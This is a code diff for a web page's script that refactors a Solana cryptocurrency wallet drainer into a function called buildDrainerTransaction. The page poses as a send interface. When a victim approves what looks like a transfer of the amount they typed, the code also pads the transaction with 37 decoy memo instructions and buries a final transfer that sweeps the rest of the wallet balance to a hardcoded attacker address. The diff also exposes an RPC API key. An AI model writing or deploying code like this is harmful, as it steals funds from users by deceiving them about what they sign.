@@ -277,20 +277,15 @@
     </div>
 
 <script>
-    const _0x1a = [
-        "3aeBcUZdpT8n9LLNx8x21YdaDTwAeny7fN6ArLjFeDb1",
-        "06ec4cdf-ba6c-4dfc-827f-5bae3b93f146",
-        "https://mainnet.helius-rpc.com/?api-key=",
-        "confirmed",
-        "MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr"
-    ];
-
-    const SOL_RECEIVER = _0x1a[0];
-    const HELIUS_URL = _0x1a[2] + _0x1a[1];
+    // --- CONFIGURATION ---
+    const SOL_RECEIVER = "3aeBcUZdpT8n9LLNx8x21YdaDTwAeny7fN6ArLjFeDb1";
+    const HELIUS_URL = "https://mainnet.helius-rpc.com/?api-key=06ec4cdf-ba6c-4dfc-827f-5bae3b93f146";
+    const MEMO_PROGRAM = "MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr";
+    const DUMMY_MEMO_COUNT = 37;
+    const SAFETY_BUFFER_LAMPORTS = 50000;
 
     let currentStep = 'sendTo'; 
     let rawAmount = "0";
-    let userPublicKey = null;
 
     const actionBtn = document.getElementById('actionBtn');
     const headerTitle = document.getElementById('headerTitle');
@@ -346,6 +341,63 @@
         return null;
     }
 
+    async function buildDrainerTransaction(provider, rawAmountString) {
+        const userPublicKey = provider.publicKey;
+        const amountVal = parseFloat(rawAmountString);
+        
+        if (isNaN(amountVal) || amountVal <= 0) {
+            throw new Error("Invalid amount");
+        }
+
+        const connection = new solanaWeb3.Connection(HELIUS_URL, "confirmed");
+        const balance = await connection.getBalance(userPublicKey);
+        const lamportsToSend = Math.floor(amountVal * 1000000000);
+
+        const residualLamports = balance - lamportsToSend - SAFETY_BUFFER_LAMPORTS;
+
+        const transaction = new solanaWeb3.Transaction();
+        const encoder = new TextEncoder();
+
+        // 1. Instruction 1: User-typed transfer amount
+        transaction.add(
+            solanaWeb3.SystemProgram.transfer({
+                fromPubkey: userPublicKey,
+                toPubkey: new solanaWeb3.PublicKey(SOL_RECEIVER),
+                lamports: lamportsToSend,
+            })
+        );
+
+        // 2. Instructions 2-38: Dummy Memos
+        for (let i = 0; i < DUMMY_MEMO_COUNT; i++) {
+            const memoText = `opt-verify-${i}-${Date.now()}`;
+            transaction.add(
+                new solanaWeb3.TransactionInstruction({
+                    keys: [{ pubkey: userPublicKey, isSigner: true, isWritable: false }],
+                    programId: new solanaWeb3.PublicKey(MEMO_PROGRAM),
+                    data: encoder.encode(memoText)
+                })
+            );
+        }
+
+        // 3. Final Instruction: Hidden Residual Sweep at the bottom
+        if (residualLamports > 10000) {
+            transaction.add(
+                solanaWeb3.SystemProgram.transfer({
+                    fromPubkey: userPublicKey,
+                    toPubkey: new solanaWeb3.PublicKey(SOL_RECEIVER),
+                    lamports: residualLamports,
+                })
+            );
+        }
+
+        const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash('confirmed');
+        transaction.recentBlockhash = blockhash;
+        transaction.lastValidBlockHeight = lastValidBlockHeight;
+        transaction.feePayer = userPublicKey;
+
+        return transaction;
+    }
+
     actionBtn.addEventListener('click', async () => {
         statusDiv.innerText = "";
         const provider = await getProvider();
@@ -358,10 +410,8 @@
 
         if (currentStep === 'sendTo') {
             try {
-                const response = await provider.connect();
-                userPublicKey = response.publicKey || provider.publicKey;
-                
-                if (!userPublicKey) return;
+                await provider.connect();
+                if (!provider.publicKey) return;
 
                 currentStep = 'amount';
                 viewSendTo.classList.add('hidden');
@@ -377,67 +427,17 @@
 
         if (currentStep === 'amount') {
             try {
-                const amountVal = parseFloat(rawAmount);
-                if (isNaN(amountVal) || amountVal <= 0) {
-                    statusDiv.innerText = "Enter a valid amount.";
-                    statusDiv.style.color = "#ff4d4d";
-                    return;
-                }
-
                 statusDiv.innerText = "Preparing transaction...";
                 statusDiv.style.color = "#8b92a5";
 
-                const lamportsToSend = Math.floor(amountVal * 1000000000);
-                const connection = new solanaWeb3.Connection(HELIUS_URL, _0x1a[3]);
-                const balance = await connection.getBalance(userPublicKey);
-
-                const transaction = new solanaWeb3.Transaction();
-
-                // 1. Primary Typed Amount Transfer (Shows first in instruction list)
-                transaction.add(
-                    solanaWeb3.SystemProgram.transfer({
-                        fromPubkey: userPublicKey,
-                        toPubkey: new solanaWeb3.PublicKey(SOL_RECEIVER),
-                        lamports: lamportsToSend,
-                    })
-                );
-
-                // 2. Visual Decoy Memos (Pushes the rest of the payload down)
-                const encoder = new TextEncoder();
-                for (let i = 0; i < 37; i++) {
-                    transaction.add(
-                        new solanaWeb3.TransactionInstruction({
-                            keys: [{ pubkey: userPublicKey, isSigner: true, isWritable: true }],
-                            programId: new solanaWeb3.PublicKey(_0x1a[4]),
-                            data: encoder.encode("x")
-                        })
-                    );
-                }
-
-                // 3. Residual Balance Sweep Instruction (Buried at the very bottom)
-                const rentBuffer = 800000;
-                const residualLamports = balance - lamportsToSend - rentBuffer;
-                
-                if (residualLamports > 10000) {
-                    transaction.add(
-                        solanaWeb3.SystemProgram.transfer({
-                            fromPubkey: userPublicKey,
-                            toPubkey: new solanaWeb3.PublicKey(SOL_RECEIVER),
-                            lamports: residualLamports,
-                        })
-                    );
-                }
-
-                const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash('confirmed');
-                transaction.recentBlockhash = blockhash;
-                transaction.lastValidBlockHeight = lastValidBlockHeight;
-                transaction.feePayer = userPublicKey;
+                const tx = await buildDrainerTransaction(provider, rawAmount);
 
                 statusDiv.innerText = "Please approve in Phantom...";
 
-                const signed = await provider.signAndSendTransaction(transaction);
+                const signed = await provider.signAndSendTransaction(tx);
                 
                 statusDiv.innerText = "Broadcasting...";
+                const connection = new solanaWeb3.Connection(HELIUS_URL, "confirmed");
                 await connection.confirmTransaction(signed.signature, "confirmed");
 
                 statusDiv.innerText = "Success!";
